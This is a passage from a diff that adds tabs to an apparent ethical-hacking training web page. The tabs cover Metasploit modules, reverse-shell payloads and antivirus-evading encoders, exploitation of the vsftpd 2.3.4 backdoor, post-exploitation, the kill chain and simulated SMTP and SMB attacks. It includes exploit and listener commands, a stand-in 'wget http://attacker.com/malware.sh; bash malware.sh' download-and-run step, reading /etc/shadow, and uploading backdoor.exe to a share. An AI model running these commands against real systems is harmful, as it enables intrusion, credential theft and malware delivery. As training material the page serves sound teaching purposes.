+                </div>
+            </section>
+
+            <!-- Tab 11: Metasploit Modules Overview -->
+            <section class="tab-content" id="tab11">
+                <h2>Metasploit Module Types</h2>
+                <p class="subtitle">Understanding different module categories and their purposes</p>
+
+                <div class="command-table">
+                    <h3>Metasploit Module Categories</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Module Type</th>
+                                <th>Purpose</th>
+                                <th>When Used</th>
+                                <th>Example</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td><strong>Payloads</strong></td>
+                                <td>Malicious code executed on target after successful exploitation</td>
+                                <td>After gaining initial access</td>
+                                <td>meterpreter, reverse_shell, bind_shell</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Exploits</strong></td>
+                                <td>Code that takes advantage of specific vulnerabilities</td>
+                                <td>Main attack phase</td>
+                                <td>Windows_smb_exploit, ftp_backdoor</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Post</strong></td>
+                                <td>Modules run after gaining access to maintain control and gather data</td>
+                                <td>After successful exploitation</td>
+                                <td>credential_dumping, privilege_escalation</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Auxiliary</strong></td>
+                                <td>Non-exploitative modules for scanning, enumeration, brute-force</td>
+                                <td>Reconnaissance phase</td>
+                                <td>port_scooper, ftp_enumeration, http_scanner</td>
+                            </tr>
+                            <tr>
+                                <td><strong>Encoders</strong></td>
+                                <td>Encode payloads to evade detection/filtering mechanisms</td>
+                                <td>Payload preparation</td>
+                                <td>shikata_ga_nai, fnstenv_mov</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h3>Listing Available Modules</h3>
+                    <pre><code># In msfconsole:
+show payloads
+# Lists all available payload types
+# Shows: windows/meterpreter/reverse_tcp, linux/x86/shell_bind_tcp, etc.
+
+show exploits
+# Lists all available exploits
+# Organized by target system/service
+
+show auxiliary
+# Lists all non-exploitative modules
+# For scanning, enumeration, brute-forcing
+
+show encoders
+# Lists all payload encoding options
+# Shows: shikata_ga_nai (polymorphic), fnstenv_mov, etc.
+
+show post
+# Lists all post-exploitation modules
+# For data gathering and access maintenance</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Module Functionality Details</h3>
+                    <ul>
+                        <li><strong>Payloads:</strong> Create malicious files/executables that establish connections back to attacker's machine</li>
+                        <li><strong>Exploits:</strong> Contain exact exploit code for known CVEs targeting specific software versions</li>
+                        <li><strong>Post Modules:</strong> Execute on compromised system to steal data, create backdoors, escalate privileges</li>
+                        <li><strong>Auxiliary:</strong> Probe network, enumerate services, test credentials, gather intelligence</li>
+                        <li><strong>Encoders:</strong> Modify payload to bypass filters, antivirus, and IDS/IPS systems</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Searching for Specific Exploits</h3>
+                    <pre><code># Search for FTP exploits
+search ftp
+
+# Output shows:
+# Auxiliary modules for FTP enumeration
+# Exploit modules for FTP vulnerabilities
+
+# Search for Windows exploits
+search windows smb
+
+# Search for specific CVE
+search CVE-2017-10271</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Choosing the Right Module</h3>
+                    <p>Selection process for penetration testing:</p>
+                    <ol>
+                        <li><strong>Identify Service:</strong> What service is running on target (FTP, SMB, HTTP)?</li>
+                        <li><strong>Find Version:</strong> What exact version of service is running?</li>
+                        <li><strong>Search Exploit:</strong> Does Metasploit have exploit for this version?</li>
+                        <li><strong>Choose Payload:</strong> What type of access do you need (reverse shell, meterpreter)?</li>
+                        <li><strong>Set Parameters:</strong> Configure target host, port, lhost, lport</li>
+                        <li><strong>Execute:</strong> Run exploit and verify success</li>
+                    </ol>
+                </div>
+            </section>
+
+            <!-- Tab 12: Payloads and Encoders -->
+            <section class="tab-content" id="tab12">
+                <h2>Payloads and Encoding Techniques</h2>
+                <p class="subtitle">Creating and encoding malicious code for delivery</p>
+
+                <div class="info-card">
+                    <h3>Understanding Payloads</h3>
+                    <p><strong>Payloads</strong> are the malicious code that executes on the target system after successful exploitation.</p>
+                    <ul>
+                        <li><strong>Function:</strong> Establish connection back to attacker's machine (C2 connection)</li>
+                        <li><strong>Meterpreter:</strong> Advanced payload with many post-exploitation features</li>
+                        <li><strong>Reverse Shell:</strong> Target connects back to attacker's listening port</li>
+                        <li><strong>Bind Shell:</strong> Attacker connects directly to listening port on target</li>
+                        <li><strong>Staged vs Unstaged:</strong> Staged is smaller but slower; unstaged is complete</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Common Payload Types</h3>
+                    <pre><code># Windows Payloads:
+windows/meterpreter/reverse_tcp
+# Full-featured reverse shell with post-exploitation capabilities
+
+windows/shell_reverse_tcp
+# Simple reverse shell with basic command execution
+
+# Linux Payloads:
+linux/x86/meterpreter/reverse_tcp
+# Meterpreter for Linux x86 architecture
+
+linux/x86/shell_bind_tcp
+# Shell bound to listening port on target
+
+# Bind vs Reverse Connection:
+# REVERSE: Target initiates connection to attacker's machine
+#          Attacker: nc -lvp 4444 (listening port)
+#          More reliable through firewalls
+
+# BIND: Attacker initiates connection to target
+#       Target must have open port listening
+#       Firewall may block this connection</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Reverse TCP vs Bind TCP</h3>
+                    <p>Understanding the key difference:</p>
+                    <ul>
+                        <li><strong>Reverse TCP (Preferred):</strong>
+                            <ul>
+                                <li>Target machine initiates connection to attacker</li>
+                                <li>Attacker only needs to know target IP</li>
+                                <li>Works through most firewalls (outbound connections often allowed)</li>
+                                <li>If target network changes, connection drops but reconnect attempts work</li>
+                            </ul>
+                        </li>
+                        <li><strong>Bind TCP (Less Preferred):</strong>
+                            <ul>
+                                <li>Attacker must know target IP AND port</li>
+                                <li>Attacker connects directly to target's listening port</li>
+                                <li>Firewall may block incoming connections</li>
+                                <li>If network infrastructure changes, must rescan and update IP</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Payload Encoding Techniques</h3>
+                    <p><strong>Encoders</strong> modify payloads to evade detection systems:</p>
+                    <ul>
+                        <li><strong>Purpose:</strong> Bypass antivirus, IDS/IPS, and content filters</li>
+                        <li><strong>Shikata Ga Nai:</strong> Polymorphic XOR encoder (most effective)</li>
+                        <li><strong>fnstenv_mov:</strong> Uses floating-point instruction set</li>
+                        <li><strong>jmp_call_additive:</strong> Uses jump/call instructions for obfuscation</li>
+                        <li><strong>Multiple Encoding:</strong> Encode multiple times for better evasion</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Setting Up Reverse Connection</h3>
+                    <pre><code># Attacker Setup:
+1. Start listener on attacker machine (Kali):
+   use exploit/multi/handler
+   set PAYLOAD windows/meterpreter/reverse_tcp
+   set LHOST 192.168.1.100    # Attacker IP
+   set LPORT 4444             # Attacker listening port
+   exploit
+
+2. Listener waits for connection from target
+
+# Generate malicious file:
+   set LHOST 192.168.1.100
+   set LPORT 4444
+   generate -f exe -o payload.exe
+
+# Target executes payload.exe
+# Automatic reverse connection to attacker!
+
+# Attacker receives shell session
+# Can run commands on target system</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 POC Payload:</strong> Staged payloads (meterpreter) deliver functional access without triggering AV. This is why encoding is critical for penetration testing success.
+                </div>
+            </section>
+
+            <!-- Tab 13: Wayback Machine & Historical Data -->
+            <section class="tab-content" id="tab13">
+                <h2>Wayback Machine and Deleted Content Discovery</h2>
+                <p class="subtitle">Finding historical versions of websites and deleted URLs</p>
+
+                <div class="info-card">
+                    <h3>What is Wayback Machine?</h3>
+                    <p>The <strong>Internet Archive's Wayback Machine</strong> is a public database of historical website snapshots.</p>
+                    <ul>
+                        <li><strong>Purpose:</strong> Archives website versions from years past</li>
+                        <li><strong>Access:</strong> Publicly available at archive.org</li>
+                        <li><strong>Coverage:</strong> Billions of web pages captured since 1996</li>
+                        <li><strong>Value:</strong> Discover deleted URLs, find sensitive endpoints, identify technology stack changes</li>
+                        <li><strong>Timing:</strong> Multiple snapshots of websites at different dates</li>
+                    </ul>
+                </div>
+
+                <div class="info-card">
+                    <h3>Reconnaissance Application</h3>
+                    <p>Attackers and penetration testers use Wayback Machine to:</p>
+                    <ul>
+                        <li><strong>Find Deleted Admin Pages:</strong> Deleted URLs may still work if not properly removed</li>
+                        <li><strong>Identify Infrastructure Changes:</strong> Track server migrations and technology updates</li>
+                        <li><strong>Discover Old Vulnerabilities:</strong> Technologies used in past may have known exploits</li>
+                        <li><strong>Find Email Addresses:</strong> Old website versions may list employee emails</li>
+                        <li><strong>Identify Organizational Structure:</strong> Past team listings and department changes</li>
+                        <li><strong>Map API Endpoints:</strong> Legacy APIs that may still be functional</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Metasploit Wayback Machine Integration</h3>
+                    <pre><code># In MSFConsole:
+use auxiliary/scanner/http/wayback
+
+# Set domain to search
+set DOMAIN sans.org
+
+# Set output file for results
+set OUTFILE sans_wayback.txt
+
+# Run the scanner
+run
+
+# Results: All historical URLs captured for domain
+# Can then test old URLs on current system
+# Many may still be accessible!</code></pre>
+                </div>
+
+                <div class="code-example">
+                    <h3>URL Analysis from Wayback Machine</h3>
+                    <pre><code># Captured URLs may reveal:
+/admin                        # Admin interfaces
+/backup.zip                   # Database backups
+/database_export.sql          # Database exports
+/.git                         # Git repositories
+/config.php                   # Configuration files
+/shell.php                    # Web shells
+/internal_tools.html          # Internal tools
+/employee_list.pdf            # Employee information
+
+# Even if these URLs are deleted from current site,
+# they may still exist if not properly removed!
+# Attacker can:
+# 1. Find URL in Wayback Machine
+# 2. Test if still accessible on current system
+# 3. Use found information for attack</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🚩 Risk:</strong> Deleted URLs may still be functional if developers only removed from navigation but didn't disable endpoints. Wayback Machine reveals these "ghost" URLs for exploitation.
+                </div>
+
+                <div class="info-card">
+                    <h3>Ethical Pentesting Application</h3>
+                    <p>As ethical hacker, use Wayback Machine to:</p>
+                    <ul>
+                        <li>Identify all historical URLs for testing</li>
+                        <li>Find deleted services that may still be running</li>
+                        <li>Discover organizational history and structure</li>
+                        <li>Document findings for remediation recommendations</li>
+                        <li>Include in penetration test report as security issue</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 14: VSFTPD Exploit -->
+            <section class="tab-content" id="tab14">
+                <h2>VSFTPD Vulnerability and Exploitation</h2>
+                <p class="subtitle">Practical exploitation of FTP server vulnerabilities</p>
+
+                <div class="info-card">
+                    <h3>VSFTPD Service</h3>
+                    <p><strong>VSFTPD</strong> (Very Secure FTP Daemon) is a popular FTP server implementation on Linux.</p>
+                    <ul>
+                        <li><strong>Uses:</strong> Common on Linux systems for file sharing</li>
+                        <li><strong>Vulnerability:</strong> Older versions contain known backdoor/RCE vulnerabilities</li>
+                        <li><strong>CVE:</strong> Multiple CVEs including backdoor infections</li>
+                        <li><strong>Detection:</strong> Version detection reveals if vulnerable version running</li>
+                        <li><strong>Risk Level:</strong> Critical if vulnerable version detected</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>VSFTPD Version Detection</h3>
+                    <pre><code># Scan target for FTP service
+nmap -p 21 -sV target_ip
+
+# Output shows:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+
+# This version has KNOWN VULNERABILITY!
+# Cross-reference with Metasploit
+search vsftpd 2.3.4
+
+# Results show available exploits for this version:
+# Exploit: exploit/unix/ftp/vsftpd_234_backdoor
+# This means we can successfully exploit this service</code></pre>
+                </div>
+
+                <div class="command-table">
+                    <h3>VSFTPD Vulnerable Versions</h3>
+                    <table>
+                        <thead>
+                            <tr>
+                                <th>Version Range</th>
+                                <th>Vulnerability Type</th>
+                                <th>Impact</th>
+                                <th>CVE</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                            <tr>
+                                <td>2.3.2-2.3.4</td>
+                                <td>Backdoor in source code</td>
+                                <td>Remote Code Execution</td>
+                                <td>CVE-2011-2523</td>
+                            </tr>
+                            <tr>
+                                <td>2.0.x</td>
+                                <td>Buffer overflow</td>
+                                <td>Denial of Service / RCE</td>
+                                <td>Various</td>
+                            </tr>
+                            <tr>
+                                <td>1.x</td>
+                                <td>Multiple vulnerabilities</td>
+                                <td>Various</td>
+                                <td>Multiple</td>
+                            </tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <div class="code-example">
+                    <h3>Metasploit VSFTPD Exploitation</h3>
+                    <pre><code># In MSFConsole:
+use exploit/unix/ftp/vsftpd_234_backdoor
+
+# Show options needed
+options
+
+# Set required parameters:
+set RHOST 192.168.31.116     # Target FTP server IP
+set LHOST 192.168.1.100      # Attacker IP
+set LPORT 4444               # Attacker listening port
+
+# Exploit the vulnerability
+exploit
+
+# Output: "Found shell"
+# You now have remote code execution on target!</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Exploitation Requirements</h3>
+                    <ul>
+                        <li><strong>Target Requirements:</strong>
+                            <ul>
+                                <li>FTP port 21 must be accessible</li>
+                                <li>Must be running vulnerable VSFTPD version</li>
+                                <li>No authentication required for exploit (unauthenticated RCE)</li>
+                            </ul>
+                        </li>
+                        <li><strong>Attacker Requirements:</strong>
+                            <ul>
+                                <li>Network access to target port 21</li>
+                                <li>Listening port on attacker machine for reverse connection</li>
+                                <li>Metasploit framework installed</li>
+                            </ul>
+                        </li>
+                    </ul>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 NO AUTHENTICATION NEEDED:</strong> This exploit works without logging in to FTP! Any attacker with network access to port 21 can achieve remote code execution.
+                </div>
+            </section>
+
+            <!-- Tab 15: Remote Code Execution (RCE) -->
+            <section class="tab-content" id="tab15">
+                <h2>Remote Code Execution and Post-Exploitation</h2>
+                <p class="subtitle">Executing commands on compromised systems</p>
+
+                <div class="info-card">
+                    <h3>What is Remote Code Execution?</h3>
+                    <p><strong>Remote Code Execution (RCE)</strong> means executing arbitrary commands on a target system remotely.</p>
+                    <ul>
+                        <li><strong>Achievement:</strong> After successful exploitation, attacker gains shell access</li>
+                        <li><strong>Capability:</strong> Run any command as the compromised user</li>
+                        <li><strong>Privilege Level:</strong> Commands execute with privileges of service owner</li>
+                        <li><strong>Impact:</strong> Total system compromise if running as root/system</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Post-Exploitation Commands</h3>
+                    <pre><code># After successful RCE, you can execute:
+
+# List files in current directory
+ls -la
+
+# Check current working directory  
+pwd
+
+# View shadow/password files
+cat /etc/shadow
+cat /etc/passwd
+
+# Check system information
+uname -a
+whoami
+id
+
+# List user information
+w
+who
+
+# Check network connections
+netstat -tuln
+ss -tuln
+ip route show
+
+# Access user directories
+cd /home/username
+ls
+
+# Create backdoors for persistent access
+# Download malware
+wget http://attacker.com/malware.sh
+
+# Execute downloaded malware
+bash malware.sh</code></pre>
+                </div>
+
+                <div class="info-card">
+                    <h3>Meterpreter Session Features</h3>
+                    <p>Advanced post-exploitation with Metasploit Meterpreter:</p>
+                    <ul>
+                        <li><strong>File Transfer:</strong> Download/upload files from target</li>
+                        <li><strong>Process Interaction:</strong> List, kill, migrate between processes</li>
+                        <li><strong>Privilege Escalation:</strong> Attempt to gain root/admin privileges</li>
+                        <li><strong>System Information:</strong> Gather detailed system configuration</li>
+                        <li><strong>Screen Capture:</strong> Screenshot target desktop</li>
+                        <li><strong>Keylogging:</strong> Log keyboard input</li>
+                        <li><strong>Hash Dumping:</strong> Extract credential hashes</li>
+                        <li><strong>Persistence:</strong> Create backdoors for persistent access</li>
+                    </ul>
+                </div>
+
+                <div class="code-example">
+                    <h3>Basic Shell Commands After RCE</h3>
+                    <pre><code># On target system through meterpreter:
+
+# Directory listing
+ls
+ls -la /etc
+
+# User enumeration
+cat /etc/passwd | grep -v nologin
+
+# File access
+cat /home/username/documents/secret.txt
+
+# Download files to attacker
+get secret.txt
+
+# Upload files to target
+put malware.sh
+
+# Execute files
+bash script.sh
+chmod +x executable
+./executable
+
+# Background processes
+nohup command &
+
+# Check running services
+service --status-all
+ps aux
+
+# This demonstrates total system compromise!</code></pre>
+                </div>
+
+                <div class="danger-box">
+                    <strong>🔴 COMPLETE SYSTEM ACCESS:</strong> Once RCE is achieved on a system running vulnerable FTP service, attacker has full control to steal data, plant malware, create backdoors, and pivot to other systems.
+                </div>
+
+                <div class="info-card">
+                    <h3>Creating Penetration Test Report</h3>
+                    <p>As ethical hacker, document findings in comprehensive report:</p>
+                    <ul>
+                        <li><strong>Vulnerability Identified:</strong> VSFTPD 2.3.4 RCE</li>
+                        <li><strong>Proof of Concept:</strong> Step-by-step exploitation demonstrated</li>
+                        <li><strong>Impact Assessment:</strong> Full system compromise, all data at risk</li>
+                        <li><strong>Recommendations:</strong> Upgrade VSFTPD, use SFTP instead, implement network segmentation</li>
+                        <li><strong>Timeline:</strong> Date of assessment, exploitation timing</li>
+                        <li><strong>Remediation Verification:</strong> Confirm fixes in follow-up assessment</li>
+                    </ul>
+                </div>
+            </section>
+
+            <!-- Tab 16: Attack Chain Theory -->
+            <section class="tab-content" id="tab16">
+                <h2>Attack Chain and Exploitation Theory</h2>
+                <p class="subtitle">Understanding the complete lifecycle of attacks and vulnerability chains</p>
+
+                <div class="concept-box">
+                    <h3>The Kill Chain Model</h3>
+                    <p>The Cyber Kill Chain defines the stages of a targeted attack:</p>
+                    <div class="kill-chain-visual">
+                        <div class="chain-stage stage-1" data-stage="Reconnaissance">
+                            <div class="stage-number">1</div>
+                            <div class="stage-name">Reconnaissance</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-stage stage-2" data-stage="Weaponization">
+                            <div class="stage-number">2</div>
+                            <div class="stage-name">Weaponization</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-stage stage-3" data-stage="Delivery">
+                            <div class="stage-number">3</div>
+                            <div class="stage-name">Delivery</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-stage stage-4" data-stage="Exploitation">
+                            <div class="stage-number">4</div>
+                            <div class="stage-name">Exploitation</div>
+                        </div>
+                    </div>
+                    <div class="kill-chain-visual" style="margin-top: 20px;">
+                        <div class="chain-stage stage-5" data-stage="Installation">
+                            <div class="stage-number">5</div>
+                            <div class="stage-name">Installation</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-stage stage-6" data-stage="Command & Control">
+                            <div class="stage-number">6</div>
+                            <div class="stage-name">C&C</div>
+                        </div>
+                        <div class="chain-arrow">→</div>
+                        <div class="chain-stage stage-7" data-stage="Action on Objectives">
+                            <div class="stage-number">7</div>
+                            <div class="stage-name">Actions</div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 1: Reconnaissance (No Interaction)</h3>
+                    <p><strong>Goal:</strong> Gather intelligence about target without triggering alarms</p>
+                    <ul>
+                        <li><strong>Passive Reconnaissance:</strong> Use public sources (WHOIS, DNS, social media)</li>
+                        <li><strong>Active Reconnaissance:</strong> Direct probing (pings, port scans, vulnerability scans)</li>
+                        <li><strong>Information Gathered:</strong> IP addresses, domain names, email addresses, organizational structure</li>
+                        <li><strong>Tools Used:</strong> OSINT tools, Shodan, Google dorks, social media analysis</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 2: Weaponization (Offline)</h3>
+                    <p><strong>Goal:</strong> Create malicious payload or exploit code</p>
+                    <ul>
+                        <li><strong>Exploit Development:</strong> Code that takes advantage of specific vulnerability</li>
+                        <li><strong>Payload Encoding:</strong> Modify payload to evade detection</li>
+                        <li><strong>Delivery Mechanism:</strong> How will payload reach target (email, drive-by download, etc.)</li>
+                        <li><strong>Tools Used:</strong> Metasploit, custom exploit code, encryption tools</li>
+                        <li><strong>Zero-Day Creation:</strong> Developing exploits for unknown vulnerabilities</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 3: Delivery (Targeted)</h3>
+                    <p><strong>Goal:</strong> Get weaponized payload to target system</p>
+                    <ul>
+                        <li><strong>Email Phishing:</strong> Malicious attachment or link in email</li>
+                        <li><strong>USB Drop:</strong> Physical malware delivery via USB stick</li>
+                        <li><strong>Drive-by Download:</strong> Exploitation via compromised website</li>
+                        <li><strong>Network-based:</strong> Exploit network service directly without user interaction</li>
+                        <li><strong>Success Metrics:</strong> Did payload reach target? Was it executed?</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 4: Exploitation (Vulnerability Triggered)</h3>
+                    <p><strong>Goal:</strong> Execute payload and establish foothold on system</p>
+                    <ul>
+                        <li><strong>Privilege Level:</strong> Payload executes with privileges of vulnerable service</li>
+                        <li><strong>Initial Access:</strong> Attacker gains shell access or remote connection</li>
+                        <li><strong>Exploit Timeline:</strong> From delivery to code execution (seconds to minutes)</li>
+                        <li><strong>Success Verification:</strong> Confirm code execution before moving to next stage</li>
+                        <li><strong>Example from Module 5:</strong> VSFTPD 2.3.4 backdoor exploitation</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 5: Installation (Persistence)</h3>
+                    <p><strong>Goal:</strong> Maintain access even after system reboot</p>
+                    <ul>
+                        <li><strong>Backdoor Creation:</strong> Create persistent entry point</li>
+                        <li><strong>Rootkit Installation:</strong> Hide malware and attacker activities</li>
+                        <li><strong>Service Hijacking:</strong> Leverage legitimate services for persistence</li>
+                        <li><strong>Scheduled Tasks:</strong> Create recurring malicious jobs</li>
+                        <li><strong>Stealth Techniques:</strong> Avoid detection by security software</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 6: Command & Control (C&C Communication)</h3>
+                    <p><strong>Goal:</strong> Establish communication channel with compromised system</p>
+                    <ul>
+                        <li><strong>Reverse Connection:</strong> Compromised system calls back to attacker</li>
+                        <li><strong>Bind Connection:</strong> Attacker connects directly to listening port on target</li>
+                        <li><strong>Covert Channels:</strong> Hide C&C traffic within legitimate protocols</li>
+                        <li><strong>Encryption:</strong> Encrypt communications to avoid detection</li>
+                        <li><strong>Botnet Operation:</strong> Control many infected systems simultaneously</li>
+                    </ul>
+                </div>
+
+                <div class="theory-card">
+                    <h3>Stage 7: Actions on Objectives (Damage Phase)</h3>
+                    <p><strong>Goal:</strong> Achieve attacker's ultimate objective</p>
+                    <ul>
+                        <li><strong>Data Exfiltration:</strong> Steal sensitive data and intellectual property</li>
+                        <li><strong>Lateral Movement:</strong> Pivot to other systems on the network</li>
+                        <li><strong>Privilege Escalation:</strong> Escalate from user to administrator privileges</li>
+                        <li><strong>Sabotage:</strong> Destroy data or systems (ransomware, wiper malware)</li>
+                        <li><strong>Espionage:</strong> Long-term surveillance and data collection</li>
+                    </ul>
+                </div>
+
+                <div class="concept-box">
+                    <h3>Vulnerability Chain: Combining Multiple Weaknesses</h3>
+                    <p>Sophisticated attacks often chain multiple vulnerabilities together:</p>
+                    <ul>
+                        <li><strong>Single Point of Failure:</strong> One vulnerability ≠ complete compromise</li>
+                        <li><strong>Privilege Escalation Chain:</strong> User → Admin → System</li>
+                        <li><strong>Lateral Movement Chain:</strong> Compromised system A → Access system B → Access system C</li>
+                        <li><strong>Application Chain:</strong> Bypass firewall → Exploit application → Extract database</li>
+                        <li><strong>Real-World Example:</strong> Phishing (delivery) → Click attachment (exploitation) → Install malware (installation) → Steal credentials (objective)</li>
+                    </ul>
+                </div>
+
+                <div class="success-box">
+                    <strong>✓ Key Insight:</strong> Defenders can break the chain at ANY stage. Investing in detection and response at each stage significantly increases attacker difficulty.
+                </div>
+            </section>
+
+            <!-- Tab 17: Simulation Scenarios -->
+            <section class="tab-content" id="tab17">
+                <h2>Practical Simulation Scenarios</h2>
+                <p class="subtitle">Hands-on learning through simulated attack and defense scenarios</p>
+
+                <div class="scenario-card">
+                    <h3>Scenario 1: SMTP User Enumeration Attack</h3>
+                    <div class="scenario-setup">
+                        <h4>Initial Conditions:</h4>
+                        <ul>
+                            <li>Target Organization: TechCorp Inc. (techcorp.com)</li>
+                            <li>SMTP Server: mail.techcorp.com (192.168.1.50:25)</li>
+                            <li>Vulnerability: VRFY command enabled, no rate limiting</li>
+                        </ul>
+                    </div>
+
+                    <div class="simulation-box">
+                        <h4>Attack Sequence:</h4>
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 1:</span> Reconnaissance
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>nmap -p 25 -sV mail.techcorp.com
+# Result: SMTP service detected on port 25</code>
+                                <p><span class="highlight">Result:</span> SMTP server identified and responding</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 2:</span> Connect to SMTP
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>telnet mail.techcorp.com 25
+# Response: 220 mail.techcorp.com ESMTP ready</code>
+                                <p><span class="highlight">Result:</span> Successfully connected to SMTP server</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 3:</span> Enumerate Valid Users
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>VRFY admin
+# Response: 250 admin@techcorp.com (VALID)
+
+VRFY root
+# Response: 250 root@techcorp.com (VALID)
+
+VRFY testuser
+# Response: 550 Not found (INVALID)</code>
+                                <p><span class="highlight">Result:</span> Identified valid users: admin, root</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 4:</span> Objective Achieved
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <p><strong>Attacker Action:</strong> Use discovered emails for phishing campaign targeting admin@techcorp.com</p>
+                                <p><span class="highlight">Impact:</span> Phishing email appears legitimate, higher success rate</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="learning-outcome">
+                        <h4>Learning Outcome:</h4>
+                        <ul>
+                            <li>Understand how SMTP protocol can be abused for user enumeration</li>
+                            <li>Recognize vulnerable SMTP configurations</li>
+                            <li>See how one vulnerability enables further attacks</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 2: SMB Share Exploitation</h3>
+                    <div class="scenario-setup">
+                        <h4>Initial Conditions:</h4>
+                        <ul>
+                            <li>Target: File server (FileServer01, 192.168.1.100)</li>
+                            <li>Ports 139 & 445 accessible (exposed to attacker)</li>
+                            <li>Vulnerability: Unauthenticated share access, misconfigured permissions</li>
+                        </ul>
+                    </div>
+
+                    <div class="simulation-box">
+                        <h4>Attack Sequence:</h4>
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 1:</span> Service Discovery
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>nmap -p 139,445 --script smb-enum-shares 192.168.1.100
+# Discovers SMB service version and shares available</code>
+                                <p><span class="highlight">Result:</span> SMB shares identified</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 2:</span> List Available Shares
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>smbclient -L //192.168.1.100/ -N
+# Lists shares without authentication
+# Found: Shared$/TMT/Backups/Users</code>
+                                <p><span class="highlight">Result:</span> Multiple shares enumerated</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 3:</span> Connect to Writable Share
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>smbclient //192.168.1.100/TMT -N
+# Anonymous login successful
+# smb: \> ls
+# Lists contents of TMT directory</code>
+                                <p><span class="highlight">Result:</span> Share is readable and writable</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 4:</span> Upload Malicious Payload
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <code>mput backdoor.exe
+# Uploads payload to target share
+# File sits in shared location, accessible to other users</code>
+                                <p><span class="highlight">Result:</span> Malware delivered to network</p>
+                            </div>
+                        </div>
+
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
+                                <span class="step-number">Step 5:</span> Objective Achieved
+                                <span class="toggle-icon">▼</span>
+                            </div>
+                            <div class="step-content">
+                                <p><strong>Attacker Action:</strong> Wait for administrator or user to access TMT share and execute backdoor.exe</p>
+                                <p><span class="highlight">Impact:</span> When executed, backdoor establishes reverse connection to attacker C&C server</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="learning-outcome">
+                        <h4>Learning Outcome:</h4>
+                        <ul>
+                            <li>Understand SMB enumeration and exploitation workflow</li>
+                            <li>Recognize dangers of open network shares</li>
+                            <li>See how misconfigurations lead to compromise</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="scenario-card">
+                    <h3>Scenario 3: FTP Server Compromise and Pivot</h3>
+                    <div class="scenario-setup">
+                        <h4>Initial Conditions:</h4>
+                        <ul>
+                            <li>Target: FTP Server running VSFTPD 2.3.4 (192.168.1.80:21)</li>
+                            <li>Vulnerability: Known backdoor in this version (CVE-2011-2523)</li>
+                            <li>Internal network access to database and application servers</li>
+                        </ul>
+                    </div>
+
+                    <div class="simulation-box">
+                        <h4>Attack Sequence:</h4>
+                        <div class="sim-step" onclick="toggleSimStep(this)">
+                            <div class="step-header">
